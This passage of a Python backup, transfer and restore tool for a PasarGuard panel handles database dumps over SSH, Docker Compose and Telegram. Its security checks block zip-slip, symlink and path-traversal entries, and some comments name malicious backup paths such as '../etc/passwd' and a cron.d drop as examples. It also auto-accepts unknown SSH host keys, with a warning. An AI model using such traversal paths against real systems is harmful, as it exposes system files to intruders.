    try:
        zf = _zipfile.ZipFile(zip_path)
    except Exception as e:
        raise ValueError(f"could not open zip {zip_path!r}: {e}")
    with zf:
        for member in zf.namelist():
            # Reject absolute paths and any entry whose joined realpath
            # would leave dest. Also reject symlinks pointing outside.
            member_path = os.path.realpath(os.path.join(dest_real, member))
            if not (member_path == dest_real
                    or member_path.startswith(dest_real + os.sep)):
                raise ValueError(f"zip-slip entry refused: {member!r}")
            info = zf.getinfo(member)
            # mode 0o12xxxx in the external_attr is a symlink; bail on those
            # too — a zip can carry symlinks that resolve outside dest.
            if (info.external_attr >> 16) & 0o170000 == 0o120000:
                raise ValueError(f"symlink entry refused: {member!r}")
        # Safe to extract.
        zf.extractall(dest_real)


def _restore_databases_remote(ssh, db_dir, remote_db_svc, backend_type=None):
    # v4.2.2 — manifest.tsv lives on the REMOTE host after extraction,
    # so we read it via SSH (see _read_manifest_remote), not locally.
    db_type, entries = _read_manifest_remote(ssh, db_dir)
    if not entries:
        _diagnose_missing_manifest(db_dir, ssh=ssh)
        return False
    effective_type = backend_type or db_type or "postgresql"
    print_info(f"Manifest declares backend: {effective_type}  ({len(entries)} database entr{'y' if len(entries)==1 else 'ies'})")

    if effective_type in ("postgresql", "timescaledb"):
        return _restore_postgres_remote(ssh, db_dir, remote_db_svc, entries)
    if effective_type in ("mysql", "mariadb"):
        return _restore_mysql_remote(ssh, db_dir, remote_db_svc, entries)
    if effective_type == "sqlite":
        return _restore_sqlite_remote(ssh, db_dir, entries)
    print_error(f"Unsupported backend in manifest: '{effective_type}'")
    return False

def _restore_databases_local(db_dir, local_db_svc, backend_type=None):
    db_type, entries = _read_manifest(db_dir)
    if not entries:
        _diagnose_missing_manifest(db_dir)
        return False
    effective_type = backend_type or db_type or "postgresql"
    print_info(f"Manifest declares backend: {effective_type}  ({len(entries)} database entr{'y' if len(entries)==1 else 'ies'})")

    if effective_type in ("postgresql", "timescaledb"):
        return _restore_postgres_local(db_dir, local_db_svc, entries)
    if effective_type in ("mysql", "mariadb"):
        return _restore_mysql_local(db_dir, local_db_svc, entries)
    if effective_type == "sqlite":
        return _restore_sqlite_local(db_dir, entries)
    print_error(f"Unsupported backend in manifest: '{effective_type}'")
    return False

# ── Postgres/MySQL shared credential-resolution helpers ────────
def _pg_credentials_from_env_lines(env_lines):
    """Resolve the Postgres user/password from a dict of env vars.
    Accepts POSTGRES_USER/POSTGRES_PASSWORD (official postgres/
    timescaledb image convention) and falls back to the project's
    historical hardcoded 'pasarguard' user with no password if
    nothing is defined — v4.2.5.
    """
    user = env_lines.get("POSTGRES_USER", "") or env_lines.get("PG_USER", "") or "pasarguard"
    pwd  = env_lines.get("POSTGRES_PASSWORD", "") or env_lines.get("PG_PASSWORD", "")
    return user, pwd


def _resolve_pg_credentials(svc=None):
    """Look in .env first, then fall back to docker-compose.yml's
    environment: block for the db service if .env has nothing
    useful — mirrors _resolve_mysql_credentials below. v4.2.5.

    v4.2.8 — try the *actually detected* compose service name first
    (passed in as `svc`, the same name backup/restore already use to
    `docker compose exec` into the right container) before falling
    back to a fixed guess-list of common names. The guess-list alone
    missed any install where the postgres/timescaledb service in
    docker-compose.yml is named something other than 'postgres',
    'timescaledb', 'db', or 'database' (e.g. 'postgresql', 'pg',
    'timescale', or a custom name) — on those installs the .env-less
    fallback silently returned no password even though the real
    service and its credentials were sitting right there in
    docker-compose.yml, identical in spirit to the MySQL service-name
    mismatch this mirrors.
    """
    env = _read_env_file(os.path.join(PASARGUARD_DIR, ".env"))
    user, pwd = _pg_credentials_from_env_lines(env)
    if not pwd:
        try:
            cfg_out = subprocess.run(
                ["docker", "compose", "config"],
                cwd=PASARGUARD_DIR, check=True,
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            ).stdout.decode("utf-8", errors="replace")
            svc_names = []
            if svc:
                svc_names.append(svc)
            for guess in ("postgres", "timescaledb", "db", "database"):
                if guess not in svc_names:
                    svc_names.append(guess)
            for svc_name in svc_names:
                compose_env = _parse_compose_env_block(cfg_out, svc_name)
                if compose_env:
                    c_user, c_pwd = _pg_credentials_from_env_lines(compose_env)
                    if c_pwd:
                        return c_user, c_pwd
        except (subprocess.CalledProcessError, OSError):
            pass
    return user, pwd


def _pg_env_flag(pwd):
    return f"-e PGPASSWORD={shlex.quote(pwd)} " if pwd else ""


def _restore_postgres_remote(ssh, db_dir, svc, entries):
    pg_user, pg_pwd = _resolve_pg_credentials(svc=svc)
    pgflag = _pg_env_flag(pg_pwd)
    print_info("Restoring globals.sql (roles / tablespaces / shared grants)...")
    if not execute_ssh_command(
        ssh,
        f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/globals.sql | "
        f"docker compose exec -T {pgflag}{shlex.quote(svc)} psql -U {shlex.quote(pg_user)} -d postgres",
        "Restoring globals.sql",
        required=True,
    ):
        return False

    for db, sql_file, _has_ts, _ts_ver in entries:
        # v4.2.1 — sql_file comes from manifest.tsv in the backup. Reject
        # path-traversal (`..`, `/`, `\`) before it lands in the cp/cat
        # command. shlex.quote alone would NOT stop `..` because the OS
        # still resolves it as a path component.
        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
            return False
        ident = _ident(db)
        print_info(f"Recreating database {C.BOLD}{db}{C.RESET}...")
        execute_ssh_command(
            ssh,
            f"cd {PASARGUARD_DIR} && docker compose exec -T {pgflag}{shlex.quote(svc)} psql -U {shlex.quote(pg_user)} -d postgres "
            f"-c {shlex.quote(f'DROP DATABASE IF EXISTS {ident} WITH (FORCE);')}",
            f"Dropping old database '{db}'",
            required=False,
        )
        if not execute_ssh_command(
            ssh,
            f"cd {PASARGUARD_DIR} && docker compose exec -T {pgflag}{shlex.quote(svc)} psql -U {shlex.quote(pg_user)} -d postgres "
            f"-c {shlex.quote(f'CREATE DATABASE {ident};')}",
            f"Creating database '{db}'",
            required=True,
        ):
            return False
        print_info(f"Restoring {sql_file} → {db}  (may take a while)...")
        if not execute_ssh_command(
            ssh,
            f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} | "
            f"docker compose exec -T {pgflag}{shlex.quote(svc)} psql -U {shlex.quote(pg_user)} -d {shlex.quote(db)}",
            f"Restoring {sql_file}",
            required=True,
        ):
            return False
    return True

# ── PostgreSQL / TimescaleDB local restore ────────────────────
def _restore_postgres_local(db_dir, svc, entries):
    pg_user, pg_pwd = _resolve_pg_credentials(svc=svc)
    pgflag = _pg_env_flag(pg_pwd)
    print_info("Restoring globals.sql (roles / tablespaces / shared grants)...")
    if not run_command(
        f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/globals.sql | "
        f"docker compose exec -T {pgflag}{shlex.quote(svc)} psql -U {shlex.quote(pg_user)} -d postgres"
    ):
        print_error("Failed to restore globals.sql")
        return False

    for db, sql_file, _has_ts, _ts_ver in entries:
        # v4.2.1 — sql_file comes from manifest.tsv. Reject path traversal
        # before the path is concatenated into a cat | psql pipeline.
        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
            return False
        ident = _ident(db)
        print_info(f"Recreating database {C.BOLD}{db}{C.RESET}...")
        run_command(
            f"cd {PASARGUARD_DIR} && docker compose exec -T {pgflag}{shlex.quote(svc)} psql -U {shlex.quote(pg_user)} -d postgres "
            f"-c {shlex.quote(f'DROP DATABASE IF EXISTS {ident} WITH (FORCE);')}"
        )
        if not run_command(
            f"cd {PASARGUARD_DIR} && docker compose exec -T {pgflag}{shlex.quote(svc)} psql -U {shlex.quote(pg_user)} -d postgres "
            f"-c {shlex.quote(f'CREATE DATABASE {ident};')}"
        ):
            print_error(f"Failed to create database '{db}'")
            return False
        print_info(f"Restoring {sql_file} → {db}  (may take a while)...")
        if not run_command(
            f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} | "
            f"docker compose exec -T {pgflag}{shlex.quote(svc)} psql -U {shlex.quote(pg_user)} -d {shlex.quote(db)}"
        ):
            print_error(f"Failed to restore {sql_file}")
            return False
    return True

# ── MySQL / MariaDB remote restore ────────────────────────────
def _mysql_candidates_from_env_lines(env_lines):
    """Build a list of (user, password) candidates from a dict of env
    vars. Checks both the script's own DB_USER/DB_PASSWORD convention
    and the official mysql/mariadb image's MYSQL_USER/MYSQL_PASSWORD /
    MYSQL_ROOT_PASSWORD convention, since credentials may be defined
    under either naming scheme (in .env or hardcoded in
    docker-compose.yml) — v4.2.5.
    """
    root_pwd  = env_lines.get("MYSQL_ROOT_PASSWORD", "")
    db_user   = env_lines.get("DB_USER", "") or env_lines.get("MYSQL_USER", "")
    db_pwd    = env_lines.get("DB_PASSWORD", "") or env_lines.get("MYSQL_PASSWORD", "")

    candidates = []
    if db_user and db_pwd:
        candidates.append((db_user, db_pwd))
    if root_pwd and ("root", root_pwd) not in candidates:
        candidates.append(("root", root_pwd))
    return candidates


def _parse_compose_env_block(text, svc):
    """Parse `docker compose config` output and pull out the
    environment: block for a given service name. Handles both the
    'KEY: value' mapping style and the '- KEY=value' list style that
    `docker compose config` normalizes to. v4.2.5.
    """
    env_lines = {}
    in_target_svc = False
    in_env_block = False
    svc_indent = None
    for raw in text.splitlines():
        stripped = raw.strip()
        indent = len(raw) - len(raw.lstrip(" "))
        if re.match(rf"^  {re.escape(svc)}:\s*$", raw):
            in_target_svc = True
            svc_indent = indent
            in_env_block = False
            continue
        if in_target_svc and indent <= svc_indent and stripped and not stripped.startswith("#") and raw.startswith("  ") and re.match(r"^  [A-Za-z0-9_-]+:\s*$", raw):
            # reached the next service at the same indent level
            in_target_svc = False
            in_env_block = False
        if not in_target_svc:
            continue
        if stripped == "environment:":
            in_env_block = True
            continue
        if in_env_block:
            if stripped.startswith("- "):
                kv = stripped[2:]
            elif ":" in stripped:
                kv = stripped.replace(":", "=", 1)
            else:
                in_env_block = False
                continue
            if "=" in kv:
                k, v = kv.split("=", 1)
                env_lines[k.strip()] = v.strip().strip('"').strip("'")
            else:
                in_env_block = False
    return env_lines


def _restore_mysql_remote(ssh, db_dir, svc, entries):
    for db, sql_file, _, _ in entries:
        # v4.2.1 — reject path traversal in sql_file (manifest-controlled).
        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
            return False
        print_info(f"Restoring {db} from {sql_file}  (may take a while)...")

        # v4.2.5 — look in .env first (script convention + image convention).
        ec, env_text, _ = ssh_shell(
            ssh,
            f"grep -E '^(DB_PASSWORD|MYSQL_ROOT_PASSWORD|DB_USER|DB_NAME|MYSQL_USER|MYSQL_PASSWORD)=' {PASARGUARD_DIR}/.env"
        )
        env_lines = {}
        for ln in env_text.splitlines():
            if "=" in ln:
                k, v = ln.split("=", 1)
                env_lines[k.strip()] = v.strip().strip('"').strip("'")
        candidates = _mysql_candidates_from_env_lines(env_lines)

        # v4.2.5 — .env may not define them at all if credentials are
        # hardcoded directly in docker-compose.yml instead. Fall back
        # to `docker compose config` and parse the mysql service's
        # environment: block in that case.
        if not candidates:
            ec_cfg, cfg_text, _ = ssh_shell(ssh, f"cd {PASARGUARD_DIR} && docker compose config")
            if ec_cfg == 0 and cfg_text:
                compose_env = _parse_compose_env_block(cfg_text, svc)
                candidates = _mysql_candidates_from_env_lines(compose_env)

        # v4.2.2 — figure out whether the dump is self-sufficient
        # (contains its own CREATE DATABASE / USE statements, i.e. it was
        # produced by mysqldump --databases) or not (an older dump
        # without --databases that only contains CREATE TABLE).
        #   * Self-sufficient dumps are loaded as-is via `mysql -u USER`.
        #   * Older dumps need CREATE DATABASE + USE prepended in a
        #     subshell pipe; otherwise every CREATE TABLE in the dump
        #     would fail with 'No database selected' on a freshly-
        #     initialised MySQL container.
        # Either way we deliberately avoid `mysql -e "..."` because on
        # MariaDB images without /etc/mysql/my.cnf the client then errors
        # out with 'no configuration file provided: not found' (a MariaDB
        # quirk) instead of running the statement.
        dump_path = f"{PASARGUARD_DIR}/{db_dir}/{sql_file}"
        ec_probe, head_text, _ = ssh_shell(ssh, f"head -n 20 {shlex.quote(dump_path)}")
        dump_has_create_db = ec_probe == 0 and "CREATE DATABASE" in (head_text or "")

        restored = False
        last_err = ""
        for cred_user, cred_pwd in candidates:
            env_flag = f"-e MYSQL_PWD={shlex.quote(cred_pwd)} " if cred_pwd else ""
            if dump_has_create_db:
                cmd = (
                    f"cd {PASARGUARD_DIR} && "
                    f"cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} | "
                    f"docker compose exec -T {env_flag}{shlex.quote(svc)} "
                    f"mysql -u {shlex.quote(cred_user)}"
                )
            else:
                # Prepend CREATE DATABASE + USE in a subshell so the dump's
                # CREATE TABLE statements have a database to land in.
                # echo + single-quoted SQL keeps backticks literal so mysql
                # (not the shell) interprets them as identifier delimiters.
                create_echo = (
                    f"echo 'CREATE DATABASE IF NOT EXISTS `{db}` "
                    f"CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;'"
                )
                use_echo = f"echo 'USE `{db}`;'"
                cmd = (
                    f"cd {PASARGUARD_DIR} && "
                    f"( {create_echo} ; {use_echo} ; "
                    f"cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} ) | "
                    f"docker compose exec -T {env_flag}{shlex.quote(svc)} "
                    f"mysql -u {shlex.quote(cred_user)}"
                )
            ec2, _, err2 = ssh_shell(ssh, cmd)
            if ec2 == 0:
                print_success(f"Restored using credentials for user '{cred_user}'.")
                restored = True
                break
            last_err = err2 or ""
            first_line = next((ln for ln in last_err.splitlines() if ln.strip()), "unknown error")
            print_warning(f"  Restore as '{cred_user}' failed: {first_line}")

        if not restored:
            print_error(f"Failed to restore {sql_file} with any known credentials.")
            if last_err.strip():
                print_error(f"Last mysql error:\n{last_err.strip()}")
            print_error("Likely causes: wrong password in .env, MySQL still")
            print_error("initialising (initdb scripts create users/databases after")
            print_error("first start), or the dump file is empty/corrupt.")
            return False
    return True

# ── MySQL / MariaDB local restore ─────────────────────────────
def _restore_mysql_local(db_dir, svc, entries):
    # v4.2.5 — check .env first (both script convention DB_USER/
    # DB_PASSWORD and image convention MYSQL_USER/MYSQL_PASSWORD).
    env = _read_env_file(os.path.join(PASARGUARD_DIR, ".env"))
    candidates = _mysql_candidates_from_env_lines(env)

    # v4.2.5 — if .env has none of these keys at all, the credentials
    # may be hardcoded directly in docker-compose.yml instead. Fall
    # back to `docker compose config` and parse the service's
    # environment: block.
    if not candidates:
        try:
            cfg_out = subprocess.run(
                ["docker", "compose", "config"],
                cwd=PASARGUARD_DIR, check=True,
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            ).stdout.decode("utf-8", errors="replace")
            compose_env = _parse_compose_env_block(cfg_out, svc)
            candidates = _mysql_candidates_from_env_lines(compose_env)
            if candidates:
                print_info("Credentials not found in .env — using values from docker-compose.yml instead.")
        except (subprocess.CalledProcessError, OSError):
            pass

    for db, sql_file, _, _ in entries:
        # v4.2.1 — reject path traversal in sql_file (manifest-controlled).
        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
            return False
        print_info(f"Restoring {db} from {sql_file}  (may take a while)...")

        # v4.2.2 — same --databases-detection + subshell-prepend fix as
        # _restore_mysql_remote. See comment there for the full rationale.
        dump_path = os.path.join(PASARGUARD_DIR, db_dir, sql_file)
        try:
            with open(dump_path, "r", errors="replace") as _df:
                head_text = "".join(iter(lambda: _df.readline(), ""))
                # Read up to 20 lines to detect the CREATE DATABASE.
                head_text += _df.read(64 * 1024)  # first ~64KB covers the header
        except OSError:
            head_text = ""
        dump_has_create_db = "CREATE DATABASE" in head_text

        restored = False
        last_err = ""
        for cred_user, cred_pwd in candidates:
            env_flag = f"-e MYSQL_PWD={shlex.quote(cred_pwd)} " if cred_pwd else ""
            if dump_has_create_db:
                cmd = (
                    f"cd {PASARGUARD_DIR} && "
                    f"cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} | "
                    f"docker compose exec -T {env_flag}{shlex.quote(svc)} "
                    f"mysql -u {shlex.quote(cred_user)}"
                )
            else:
                create_echo = (
                    f"echo 'CREATE DATABASE IF NOT EXISTS `{db}` "
                    f"CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;'"
                )
                use_echo = f"echo 'USE `{db}`;'"
                cmd = (
                    f"cd {PASARGUARD_DIR} && "
                    f"( {create_echo} ; {use_echo} ; "
                    f"cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} ) | "
                    f"docker compose exec -T {env_flag}{shlex.quote(svc)} "
                    f"mysql -u {shlex.quote(cred_user)}"
                )
            try:
                subprocess.run(cmd, shell=True, check=True,
                               stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                               cwd=PASARGUARD_DIR)
                print_success(f"Restored using credentials for user '{cred_user}'.")
                restored = True
                break
            except subprocess.CalledProcessError as e:
                last_err = e.stderr.decode("utf-8", errors="replace").strip() if e.stderr else ""
                first_line = next((ln for ln in last_err.splitlines() if ln.strip()), "unknown error")
                print_warning(f"  Restore as '{cred_user}' failed: {first_line}")

        if not restored:
            print_error(f"Failed to restore {sql_file} with any known credentials.")
            if last_err:
                print_error(f"Last mysql error:\n{last_err}")
            return False
    return True

# ── SQLite remote restore ─────────────────────────────────────
def _restore_sqlite_remote(ssh, db_dir, entries):
    for db, sql_file, _, _ in entries:
        # v4.2.1 — sql_file comes from a backup's manifest.tsv. Reject
        # path-traversal attempts (`../etc/passwd`) before concatenating
        # into the cp command. shlex.quote alone would not stop `..`
        # because the OS still resolves it.
        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
            return False
        ec, env_text, _ = ssh_shell(ssh, f"grep -E '^SQLALCHEMY_DATABASE_URL=' {PASARGUARD_DIR}/.env")
        target = "/var/lib/pasarguard/db.sqlite3"
        if "=" in env_text:
            url = env_text.split("=", 1)[1].strip().strip('"').strip("'")
            path = url.split("://", 1)[-1].lstrip("/")
            if path and not path.startswith(":"):
                candidate = "/" + path
                # v4.2.1 — only allow restore targets under /var/lib/pasarguard/.
                # A malicious backup's .env could set SQLALCHEMY_DATABASE_URL
                # to point anywhere on disk; we refuse anything else.
                allowed_prefix = "/var/lib/pasarguard/"
                if not _is_safe_restore_target(candidate, allowed_prefix):
                    print_error(f"Refusing unsafe SQLite target {candidate!r} — must be under {allowed_prefix}.")
                    return False
                target = candidate
        print_info(f"Restoring SQLite database → {target}")
        execute_ssh_command(ssh, "cd /opt/pasarguard && docker compose stop pasarguard", "Stopping panel", required=False)
        execute_ssh_command(ssh, f"rm -f {shlex.quote(target)} {shlex.quote(target)}-wal {shlex.quote(target)}-shm", "Removing old SQLite + WAL/SHM", required=False)
        if not execute_ssh_command(
            ssh,
            f"cp {shlex.quote(db_dir)}/{shlex.quote(sql_file)} {shlex.quote(target)} && chmod 0644 {shlex.quote(target)}",
            f"Restoring SQLite file {sql_file}",
            required=True,
        ):
            return False
        execute_ssh_command(ssh, "cd /opt/pasarguard && docker compose start pasarguard", "Starting panel", required=False)
    return True

# ── SQLite local restore ──────────────────────────────────────
def _restore_sqlite_local(db_dir, entries):
    env = _read_env_file(os.path.join(PASARGUARD_DIR, ".env"))
    target = "/var/lib/pasarguard/db.sqlite3"
    url = env.get("SQLALCHEMY_DATABASE_URL", "")
    if url.startswith("sqlite"):
        path = url.split("://", 1)[-1].lstrip("/")
        if path and not path.startswith(":"):
            candidate = "/" + path
            # v4.2.1 — only allow restore targets under /var/lib/pasarguard/.
            allowed_prefix = "/var/lib/pasarguard/"
            if not _is_safe_restore_target(candidate, allowed_prefix):
                print_error(f"Refusing unsafe SQLite target {candidate!r} — must be under {allowed_prefix}.")
                return False
            target = candidate

    for db, sql_file, _, _ in entries:
        # v4.2.1 — sql_file comes from manifest.tsv in the archive. A
        # malicious backup could include `../etc/passwd` here to escape
        # `db_dir`. Reject anything with path separators or traversal.
        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
            return False
        print_info(f"Restoring SQLite database → {target}")
        run_command("cd /opt/pasarguard && docker compose stop pasarguard", quiet=True)
        run_command(f"rm -f {shlex.quote(target)} {shlex.quote(target)}-wal {shlex.quote(target)}-shm", quiet=True)
        if not run_command(
            f"cp {shlex.quote(os.path.join(db_dir, sql_file))} {shlex.quote(target)} && chmod 0644 {shlex.quote(target)}"
        ):
            print_error(f"Failed to restore SQLite file {sql_file}")
            return False
        run_command("cd /opt/pasarguard && docker compose start pasarguard", quiet=True)
    return True

def workflow_transfer():
    print_header("Auto Backup & Transfer to New Server")

    include_node = ask_backup_scope()
    zip_path = create_backup(include_node)
    if not zip_path or not os.path.exists(zip_path):
        print_error("Aborting — backup failed.")
        return

    # v4.2.4 — verify the archive actually contains a usable manifest
    # BEFORE we spend time uploading it, wiping the destination server,
    # and only THEN discovering the restore has nothing to work with.
    # This is the same check the remote side does, run locally first so
    # a broken backup fails fast with the local files still on disk to
    # inspect, instead of failing after the destination is already wiped.
    if not _verify_zip_has_manifest(zip_path):
        print_error("Aborting — refusing to transfer a backup with no usable "
                     "database manifest. Re-run 'Manual Backup' and check the "
                     "'Exporting database...' step above for errors.")
        return

    print()
    send_tg = input(f"  {C.R2}> Send backup to Telegram first? (y/n): {C.RESET}").strip().lower()
    if send_tg == "y":
        bot_token = input(f"  {C.R2}> Bot Token: {C.RESET}").strip()
        admin_id  = input(f"  {C.R2}> Admin Chat ID: {C.RESET}").strip()
        proxy = ask_telegram_proxy()
        print_info("Uploading to Telegram...")
        cap = (f"PasarGuard {'+ PG-Node ' if include_node else ''}Manual Transfer Backup\n"
               f"Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        success, details = send_telegram_backup_archive(zip_path, cap, bot_token, admin_id, proxy)
        if success: print_success("Sent to Telegram!")
        else:       print_error(f"Telegram upload failed: {details}")

    print()
    print(f"  {C.R1}{C.BOLD}--- New Server Information ---{C.RESET}")
    new_ip   = input(f"  {C.R2}> New Server IP: {C.RESET}").strip()
    confirm  = input(f"  {C.R1}> User MUST be root. Confirm? (y/n): {C.RESET}").strip().lower()
    if confirm != "y":
        print_error("Root access required. Aborting.")
        return
    # v4.2: use getpass so the root password isn't echoed to the terminal
    # or left sitting in shell/screen scrollback.
    new_pass = getpass.getpass(f"  {C.R2}> Root Password: {C.RESET}").strip()

    print_info(f"Connecting to {new_ip}...")
    ssh = paramiko.SSHClient()
    # NOTE: this still auto-accepts unknown host keys (no TOFU verification
    # against a known_hosts file), which is inherently weak against a
    # man-in-the-middle on first connect. We at least surface that clearly
    # instead of doing it silently — see warning below.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print_warning("SSH host key will be trusted on first connect (no verification). "
                  "Make sure you're on a trusted network.")
    try:
        ssh.connect(hostname=new_ip, username="root", password=new_pass, timeout=10)
        print_success("Connected!")
        print()

        execute_ssh_command(ssh,
            "apt-get update >/dev/null 2>&1 && apt-get install -y unzip >/dev/null 2>&1",
            "Installing unzip")

        if include_node:
            if not stop_compose_ssh(ssh, PG_NODE_DIR, "PG-Node"):
                print_error("Could not stop PG-Node. Aborting.")
                return
        if not stop_compose_ssh(ssh, PASARGUARD_DIR, "Pasarguard"):
            print_error("Could not stop Pasarguard. Aborting.")
            return

        if not clean_dirs_ssh(ssh, include_node):
            print_error("Directory cleanup failed. Aborting.")
            return

        print_info("Uploading backup file (depends on internet speed)...")
        sftp       = ssh.open_sftp()
        zip_fn     = os.path.basename(zip_path)
        remote_zip = f"/opt/pasarguard/{zip_fn}"
        sftp.put(zip_path, remote_zip)
        sftp.chmod(remote_zip, 0o600)
        sftp.close()
        print_success("Upload completed.")

        # v4.2.1 — pre-validate the archive LOCALLY before asking the
        # remote to extract it. A malicious or tampered backup could carry
        # entries like `../../etc/cron.d/evil`; refusing up-front (rather
        # than letting the remote `unzip` write them out as root) keeps
        # the transfer host safe too. _safe_extract_zip also extracts
        # safely if we pass `extract=False`, but for the transfer path
        # we still let the remote do the extraction so any non-/opt/
        # entries surface there.
        try:
            with zipfile.ZipFile(zip_path) as _z:
                for _member in _z.namelist():
                    _target = os.path.realpath(os.path.join("/opt/pasarguard", _member))
                    if not (_target == os.path.realpath("/opt/pasarguard")
                            or _target.startswith(os.path.realpath("/opt/pasarguard") + os.sep)):
                        raise ValueError(f"zip-slip entry refused: {_member!r}")
        except (ValueError, zipfile.BadZipFile) as e:
            print_error(f"Refusing to extract archive on remote: {e}")
            return

        execute_ssh_command(ssh, f"cd /opt/pasarguard && unzip -q -o {shlex.quote(zip_fn)}",
                            "Extracting files")

        try:
            remote_backend = _detect_backend_ssh(ssh)
        except Exception as e:
            print_warning(f"Backend detection failed on remote: {e} — assuming legacy postgres")
            remote_backend = {"type": "postgresql", "container": None, "dbname": "pasarguard",
                              "user": "pasarguard", "password": "", "env": {}, "services": [],
                              "host": "127.0.0.1", "port": 5432, "sqlite_path": None}
        print_info(
            f"Detected remote backend: {C.BOLD}{remote_backend['type']}{C.RESET}  "
            f"db={remote_backend['dbname']}  container={remote_backend['container'] or '(none — sqlite)'}"
        )

        execute_ssh_command(ssh,
            "cp -a /opt/pasarguard/pasarguard_data/. /var/lib/pasarguard/ 2>/dev/null || true "
            "&& rm -rf /opt/pasarguard/pasarguard_data",
            "Restoring PasarGuard data")

        if include_node:
            execute_ssh_command(ssh,
                "cp -a /opt/pasarguard/pg_node_opt/. /opt/pg-node/ 2>/dev/null || true "
                "&& rm -rf /opt/pasarguard/pg_node_opt",
                "Restoring PG-Node config")
            execute_ssh_command(ssh,
                "cp -a /opt/pasarguard/pg_node_data/. /var/lib/pg-node/ 2>/dev/null || true "
                "&& rm -rf /opt/pasarguard/pg_node_data",
                "Restoring PG-Node data")

        if remote_backend["type"] == "sqlite":
            if not _restore_databases_remote(ssh, "db_dump", None, backend_type="sqlite"):
                print_error("SQLite restore failed. Aborting.")
                return
            if not start_compose_ssh(ssh, PASARGUARD_DIR, "Pasarguard"):
                print_error("Pasarguard did not start. Aborting.")
                return
            if include_node and not start_compose_ssh(ssh, PG_NODE_DIR, "PG-Node"):
                print_error("PG-Node did not start.")
            print_header("Transfer & Restore Completed Successfully!")
            print_success("PasarGuard" + (" and PG-Node are" if include_node else " is") +
                          " running on the new server.")
            return

        remote_db_svc = remote_backend["container"]
        if not remote_db_svc:
            print_error(f"Could not determine the {remote_backend['type']} container for restore.")
            return

        # v4.2.3 — wipe MySQL data dir BEFORE starting the container so it
        # re-inits with the credentials from the new .env. MySQL only reads
        # MYSQL_ROOT_PASSWORD on first init; stale data on a bind mount
        # (the typical PasarGuard install) survives `docker compose down -v`
        # and would silently keep the OLD password, causing 1045 during
        # restore. This must run after the zip is extracted (so we see the
        # new docker-compose.yml) and before start_compose_ssh starts MySQL.
        if remote_backend["type"] in ("mysql", "mariadb"):
            _wipe_mysql_data_remote(ssh, remote_db_svc)

        # v4.2.2 — pass backend_type so wait_db_* picks the right readiness
        # probe (pg_isready for postgres/timescaledb, mysqladmin ping for
        # mysql/mariadb). Previously wait_postgres=True hard-coded pg_isready
        # which doesn't exist in a mysql image, so the wait always timed out
        # and the whole transfer aborted with 'mysql did not start'.
        if not start_compose_ssh(ssh, PASARGUARD_DIR, "Pasarguard DB",
                                  services=[remote_db_svc], wait_db=True,
                                  backend_type=remote_backend["type"]):
            print_error(f"{remote_db_svc} did not start. Aborting.")
            return

        if not _restore_databases_remote(ssh, "db_dump", remote_db_svc, backend_type=remote_backend["type"]):
            print_error("Database restore failed. Aborting.")
            return

        if not start_compose_ssh(ssh, PASARGUARD_DIR, "Pasarguard"):
            print_error("Pasarguard did not start. Aborting.")
            return
        if include_node and not start_compose_ssh(ssh, PG_NODE_DIR, "PG-Node"):
            print_error("PG-Node did not start.")

        print_header("Transfer & Restore Completed Successfully!")
        print_success("PasarGuard" + (" and PG-Node are" if include_node else " is") +
                      " running on the new server.")

    except paramiko.AuthenticationException:
        print_error("Incorrect server password!")
    except Exception as e:
        print_error(f"Connection error: {e}")
    finally:
        ssh.close()
        try:
            if os.path.exists(zip_path):
                os.remove(zip_path)
        except Exception:
            pass

# ── Workflow 2: Scheduled Telegram backup ────────────────────
def run_scheduled_backup_loop(bot_token, admin_id, interval_h, include_node, proxy=None, instance=None):
    interval_s  = int(interval_h * 3600)
    scope_label = "PasarGuard + PG-Node" if include_node else "PasarGuard only"
    print_info(f"Scheduler started  scope: {C.BOLD}{scope_label}{C.RESET}  every {interval_h}h")
    print_warning("Press Ctrl+C to stop.")
    print(hline())

    try:
        while True:
            now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            write_state(instance, "backing_up", now_str)
            print(f"\n  {C.R2}[..]{C.RESET}  {C.WH}Starting scheduled backup at {now_str}...{C.RESET}")

            zip_path = create_backup(include_node)
            if zip_path and os.path.exists(zip_path):
                print_info("Uploading to Telegram...")
                cap = (f"PasarGuard {'+ PG-Node ' if include_node else ''}Auto Backup\n"
                       f"Date: {now_str}\nInterval: {interval_h}h")
                success, details = send_telegram_backup_archive(zip_path, cap, bot_token, admin_id, proxy)
                if success: print_success("Backup sent to Telegram!")
                else:       print_error(f"Send failed: {details}")
                try:
                    os.remove(zip_path)
                    print_info("Local archive removed.")
                except Exception:
                    pass
            else:
                print_error("Backup failed — skipping upload.")

            next_run = datetime.datetime.now() + datetime.timedelta(seconds=interval_s)
            write_state(instance, "sleeping", next_run.strftime("%Y-%m-%d %H:%M:%S"))
